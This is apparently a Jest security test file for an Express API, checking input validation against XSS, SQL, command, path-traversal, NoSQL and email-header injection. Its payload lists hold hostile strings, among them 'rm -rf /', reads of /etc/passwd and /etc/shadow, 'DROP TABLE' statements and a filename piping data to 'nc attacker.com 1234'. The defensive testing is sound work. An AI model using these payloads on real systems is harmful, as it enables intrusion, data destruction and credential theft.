/**
 * Input Validation Security Test Suite
 * Tests for XSS, SQL injection, command injection, and other input-based vulnerabilities
 */

const request = require('supertest');
const express = require('express');
const { query } = require('../../src/config/database');
const { authenticate } = require('../../src/middleware/auth');
const { generateTestToken } = require('../test-utils');

// Mock dependencies
jest.mock('../../src/config/database');
jest.mock('../../src/utils/logger');

describe('Input Validation Security Tests', () => {
  let app;

  beforeEach(() => {
    app = express();
    app.use(express.json());
    app.use(express.urlencoded({ extended: true }));
    jest.clearAllMocks();
  });

  describe('XSS (Cross-Site Scripting) Prevention', () => {
    test('should sanitize HTML tags in user input', async () => {
      app.post('/api/profile', authenticate, (req, res) => {
        // Simulate storing and returning user input
        const sanitized = {
          name: req.body.name?.replace(/<[^>]*>/g, ''),
          bio: req.body.bio?.replace(/<[^>]*>/g, ''),
          website: req.body.website
        };
        res.json({ profile: sanitized });
      });

      const xssPayloads = [
        { name: '<script>alert("XSS")</script>John' },
        { bio: '<img src=x onerror=alert("XSS")>' },
        { name: '<iframe src="javascript:alert(\'XSS\')"></iframe>' },
        { bio: '<svg onload=alert("XSS")>' },
        { name: 'John<script>document.cookie</script>' }
      ];

      // Mock auth
      query.mockImplementation(() => ({ 
        rows: [{ id: 'user-123', subscription_status: 'active' }] 
      }));

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/profile')
          .set('Authorization', `Bearer ${generateTestToken()}`)
          .send(payload)
          .expect(200);

        // Check that script tags are removed
        if (payload.name) {
          expect(response.body.profile.name).not.toContain('<script>');
          expect(response.body.profile.name).not.toContain('<iframe>');
          expect(response.body.profile.name).not.toContain('<img');
        }
        if (payload.bio) {
          expect(response.body.profile.bio).not.toContain('<');
          expect(response.body.profile.bio).not.toContain('onerror');
          expect(response.body.profile.bio).not.toContain('onload');
        }
      }
    });

    test('should escape special characters in JSON responses', async () => {
      app.get('/api/search', (req, res) => {
        // Properly escape user input in JSON
        res.json({ 
          query: req.query.q,
          results: [],
          // JSON.stringify automatically escapes dangerous characters
          safe_query: JSON.stringify(req.query.q)
        });
      });

      const dangerousQueries = [
        '"; alert("XSS"); //',
        '</script><script>alert("XSS")</script>',
        '\\"; alert(String.fromCharCode(88,83,83)); //',
        '"+alert("XSS")+"'
      ];

      for (const query of dangerousQueries) {
        const response = await request(app)
          .get('/api/search')
          .query({ q: query })
          .expect(200);

        // Verify the response doesn't execute as script
        expect(response.text).not.toContain('<script>');
        expect(response.body.safe_query).toContain('\\');
      }
    });

    test('should validate Content-Type headers to prevent XSS', async () => {
      app.post('/api/data', (req, res) => {
        // Should reject non-JSON content types for JSON endpoints
        if (req.get('Content-Type') !== 'application/json') {
          return res.status(400).json({ error: 'Invalid content type' });
        }
        res.json({ received: req.body });
      });

      // Try to send HTML as content type
      const response = await request(app)
        .post('/api/data')
        .set('Content-Type', 'text/html')
        .send('<script>alert("XSS")</script>')
        .expect(400);

      expect(response.body.error).toContain('Invalid content type');
    });
  });

  describe('SQL Injection Prevention', () => {
    test('should use parameterized queries for user input', async () => {
      app.get('/api/users/:id', authenticate, async (req, res) => {
        try {
          // Good: Using parameterized query
          const result = await query(
            'SELECT id, email, first_name FROM users WHERE id = $1',
            [req.params.id]
          );
          res.json({ user: result.rows[0] });
        } catch (error) {
          res.status(500).json({ error: 'Database error' });
        }
      });

      // Mock auth
      query.mockImplementation((sql, params) => {
        if (sql.includes('user_sessions')) {
          return { rows: [{ id: 'session-123' }] };
        }
        if (sql.includes('users') && sql.includes('WHERE id = $1')) {
          // Verify parameterized query is used
          expect(params).toBeDefined();
          expect(params[0]).toBeDefined();
          return { rows: [{ id: params[0], email: 'test@example.com' }] };
        }
        return { rows: [] };
      });

      const sqlInjectionPayloads = [
        "1' OR '1'='1",
        "1'; DROP TABLE users; --",
        "1' UNION SELECT * FROM passwords --",
        "1' AND 1=1 --",
        "1' OR SLEEP(5) --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get(`/api/users/${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${generateTestToken()}`)
          .expect(200);

        // Verify the payload was treated as a literal string
        const capturedParams = query.mock.calls.find(
          call => call[0].includes('WHERE id = $1')
        )?.[1];
        
        expect(capturedParams?.[0]).toBe(payload);
      }
    });

    test('should sanitize search queries', async () => {
      app.get('/api/content/search', authenticate, async (req, res) => {
        // Sanitize search term for LIKE queries
        const searchTerm = req.query.q
          ?.replace(/[%_]/g, '\\$&') // Escape SQL wildcards
          ?.replace(/['";\\]/g, ''); // Remove dangerous characters

        try {
          const result = await query(
            'SELECT * FROM content WHERE title ILIKE $1',
            [`%${searchTerm}%`]
          );
          res.json({ results: result.rows });
        } catch (error) {
          res.status(500).json({ error: 'Search failed' });
        }
      });

      query.mockImplementation((sql, params) => {
        if (sql.includes('user_sessions')) {
          return { rows: [{ id: 'session-123' }] };
        }
        if (sql.includes('content')) {
          // Check that wildcards are escaped
          expect(params[0]).not.toContain("'");
          expect(params[0]).not.toContain('"');
          return { rows: [] };
        }
        return { rows: [{ id: 'user-123', subscription_status: 'active' }] };
      });

      const searchPayloads = [
        "test%' OR 1=1 --",
        "'; DELETE FROM content; --",
        '%" OR ""="',
        "test_; DROP TABLE users; --"
      ];

      for (const payload of searchPayloads) {
        await request(app)
          .get('/api/content/search')
          .query({ q: payload })
          .set('Authorization', `Bearer ${generateTestToken()}`)
          .expect(200);

        // Verify dangerous characters were removed
        const capturedParams = query.mock.calls.find(
          call => call[0].includes('ILIKE')
        )?.[1];
        
        expect(capturedParams?.[0]).not.toContain("'");
        expect(capturedParams?.[0]).not.toContain(";");
      }
    });

    test('should validate numeric inputs', async () => {
      app.get('/api/posts', authenticate, async (req, res) => {
        const limit = parseInt(req.query.limit) || 10;
        const offset = parseInt(req.query.offset) || 0;

        // Validate ranges
        if (limit < 1 || limit > 100 || offset < 0) {
          return res.status(400).json({ error: 'Invalid pagination parameters' });
        }

        const result = await query(
          'SELECT * FROM posts WHERE user_id = $1 LIMIT $2 OFFSET $3',
          [req.user.id, limit, offset]
        );
        res.json({ posts: result.rows });
      });

      query.mockImplementation(() => ({
        rows: [{ id: 'user-123', subscription_status: 'active' }]
      }));

      // Test SQL injection in numeric fields
      const numericPayloads = [
        { limit: "10; DROP TABLE posts; --", offset: 0 },
        { limit: 10, offset: "-1 UNION SELECT * FROM users" },
        { limit: "10 OR 1=1", offset: 0 }
      ];

      for (const payload of numericPayloads) {
        await request(app)
          .get('/api/posts')
          .query(payload)
          .set('Authorization', `Bearer ${generateTestToken()}`)
          .expect(200); // parseInt will convert to NaN or valid number
      }
    });
  });

  describe('Command Injection Prevention', () => {
    test('should prevent shell command injection in file operations', async () => {
      app.post('/api/export', authenticate, (req, res) => {
        const filename = req.body.filename;
        
        // Validate filename
        if (!/^[a-zA-Z0-9_-]+\.(csv|pdf|xlsx)$/.test(filename)) {
          return res.status(400).json({ error: 'Invalid filename' });
        }

        // Simulate file operation (DO NOT use shell commands with user input)
        res.json({ 
          message: 'Export queued',
          filename: filename
        });
      });

      query.mockImplementation(() => ({
        rows: [{ id: 'user-123', subscription_status: 'active' }]
      }));

      const commandInjectionPayloads = [
        'file.csv; rm -rf /',
        'file.csv && cat /etc/passwd',
        'file$(whoami).csv',
        'file`id`.csv',
        'file.csv | nc attacker.com 1234',
        '../../../etc/passwd'
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/export')
          .set('Authorization', `Bearer ${generateTestToken()}`)
          .send({ filename: payload })
          .expect(400);

        expect(response.body.error).toContain('Invalid filename');
      }
    });

    test('should sanitize user input in system operations', async () => {
      app.post('/api/generate-report', authenticate, (req, res) => {
        const reportType = req.body.type;
        
        // Whitelist allowed report types
        const allowedTypes = ['daily', 'weekly', 'monthly', 'yearly'];
        if (!allowedTypes.includes(reportType)) {
          return res.status(400).json({ error: 'Invalid report type' });
        }

        res.json({ 
          message: 'Report generation started',
          type: reportType
        });
      });

      query.mockImplementation(() => ({
        rows: [{ id: 'user-123', subscription_status: 'active' }]
      }));

      const response = await request(app)
        .post('/api/generate-report')
        .set('Authorization', `Bearer ${generateTestToken()}`)
        .send({ type: 'daily; cat /etc/passwd' })
        .expect(400);

      expect(response.body.error).toContain('Invalid report type');
    });
  });

  describe('Path Traversal Prevention', () => {
    test('should prevent directory traversal in file access', async () => {
      app.get('/api/files/:filename', authenticate, (req, res) => {
        const filename = req.params.filename;
        
        // Prevent path traversal
        if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
          return res.status(400).json({ error: 'Invalid filename' });
        }

        // Additional validation
        if (!/^[a-zA-Z0-9_-]+\.[a-zA-Z0-9]+$/.test(filename)) {
          return res.status(400).json({ error: 'Invalid filename format' });
        }

        res.json({ filename: filename });
      });

      query.mockImplementation(() => ({
        rows: [{ id: 'user-123', subscription_status: 'active' }]
      }));

      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'files/../../../etc/shadow',
        'valid.pdf/../../../etc/hosts',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .get(`/api/files/${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${generateTestToken()}`)
          .expect(400);

        expect(response.body.error).toContain('Invalid filename');
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    test('should validate MongoDB query operators', async () => {
      app.post('/api/search/advanced', authenticate, (req, res) => {
        const searchQuery = req.body.query;
        
        // Check for dangerous MongoDB operators
        const dangerousOperators = ['$where', '$regex', '$ne', '$gt', '$lt'];
        const queryString = JSON.stringify(searchQuery);
        
        for (const op of dangerousOperators) {
          if (queryString.includes(op)) {
            return res.status(400).json({ error: 'Invalid search query' });
          }
        }

        res.json({ results: [] });
      });

      query.mockImplementation(() => ({
        rows: [{ id: 'user-123', subscription_status: 'active' }]
      }));

      const noSqlPayloads = [
        { query: { $where: "this.password.match(/.*/)"}},
        { query: { username: { $ne: null }}},
        { query: { age: { $gt: undefined }}},
        { query: { email: { $regex: ".*" }}}
      ];

      for (const payload of noSqlPayloads) {
        const response = await request(app)
          .post('/api/search/advanced')
          .set('Authorization', `Bearer ${generateTestToken()}`)
          .send(payload)
          .expect(400);

        expect(response.body.error).toContain('Invalid search query');
      }
    });
  });

  describe('Email Injection Prevention', () => {
    test('should validate email headers to prevent injection', async () => {
      app.post('/api/contact', (req, res) => {
        const { email, subject, message } = req.body;
        
        // Validate email format
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
          return res.status(400).json({ error: 'Invalid email format' });
        }

        // Check for header injection
        if (email.includes('\n') || email.includes('\r') || 
            subject?.includes('\n') || subject?.includes('\r')) {
          return res.status(400).json({ error: 'Invalid input detected' });
        }

        res.json({ message: 'Contact form submitted' });
      });

      const emailInjectionPayloads = [
        {
          email: 'attacker@example.com\nBcc: victim@example.com',
          subject: 'Normal subject',
          message: 'Test'
        },
        {
          email: 'user@example.com',
          subject: 'Test\r\nContent-Type: text/html',
          message: '<script>alert("XSS")</script>'
        },
        {
          email: 'test@example.com\rCc: spam@example.com',
          subject: 'Test',
          message: 'Test'
        }
      ];

      for (const payload of emailInjectionPayloads) {
        const response = await request(app)
          .post('/api/contact')
          .send(payload)
          .expect(400);

        expect(response.body.error).toBeDefined();
      }
    });
  });

  describe('JSON Schema Validation', () => {
    test('should validate request body against schema', async () => {
      app.post('/api/workshop/step', authenticate, (req, res) => {
        const { stepId, data } = req.body;
        
        // Validate required fields
        if (!stepId || typeof stepId !== 'string') {
          return res.status(400).json({ error: 'Invalid stepId' });
        }

        if (!data || typeof data !== 'object') {
          return res.status(400).json({ error: 'Invalid data format' });
        }

        // Validate specific step data
        if (stepId === 'values_audit') {
          if (!Array.isArray(data.values) || data.values.length === 0) {
            return res.status(400).json({ error: 'Values must be a non-empty array' });
          }
          
          // Validate each value
          for (const value of data.values) {
            if (typeof value !== 'string' || value.length > 50) {
              return res.status(400).json({ error: 'Invalid value format' });
            }
          }
        }

        res.json({ success: true });
      });

      query.mockImplementation(() => ({
        rows: [{ id: 'user-123', subscription_status: 'active' }]
      }));

      // Test various invalid payloads
      const invalidPayloads = [
        { stepId: null, data: {} },
        { stepId: 123, data: {} }, // Wrong type
        { stepId: 'values_audit', data: 'not-an-object' },
        { stepId: 'values_audit', data: { values: 'not-an-array' } },
        { stepId: 'values_audit', data: { values: [] } }, // Empty array
        { stepId: 'values_audit', data: { values: ['x'.repeat(51)] } } // Too long
      ];

      for (const payload of invalidPayloads) {
        const response = await request(app)
          .post('/api/workshop/step')
          .set('Authorization', `Bearer ${generateTestToken()}`)
          .send(payload)
          .expect(400);

        expect(response.body.error).toBeDefined();
      }
    });
  });
});